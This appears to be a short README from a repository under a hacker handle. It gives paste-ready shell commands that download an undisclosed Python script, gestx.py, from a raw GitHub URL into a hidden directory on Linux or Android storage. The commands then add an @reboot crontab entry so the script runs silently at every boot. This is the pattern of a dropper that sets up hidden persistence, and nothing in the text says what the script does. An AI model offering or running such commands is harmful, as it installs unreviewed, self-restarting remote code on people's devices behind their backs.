# files
curl -sSL https://raw.githubusercontent.com/trh4ckn0n/files/refs/heads/main/gestx.py -o gest.py
```bash
mkdir -p ~/.trhacknon && curl -sSL https://raw.githubusercontent.com/trh4ckn0n/files/refs/heads/main/gestx.py -o ~/.trhacknon/gestx.py && chmod +x ~/.trhacknon/gestx.py && (crontab -l 2>/dev/null; echo "@reboot /usr/bin/python3 $HOME/.trhacknon/gestx.py >> /tmp/gestx.log 2>&1") | crontab -
```

```bash
mkdir -p /sdcard/Download/.trhacknon && curl -sSL https://raw.githubusercontent.com/trh4ckn0n/files/refs/heads/main/gestx.py -o /sdcard/Download/.trhacknon/gestx.py && chmod +x /sdcard/Download/.trhacknon/gestx.py && (crontab -l 2>/dev/null; echo "@reboot /usr/bin/python3 /sdcard/Download/.trhacknon/gestx.py >> /tmp/gestx.log 2>&1") | crontab -
```
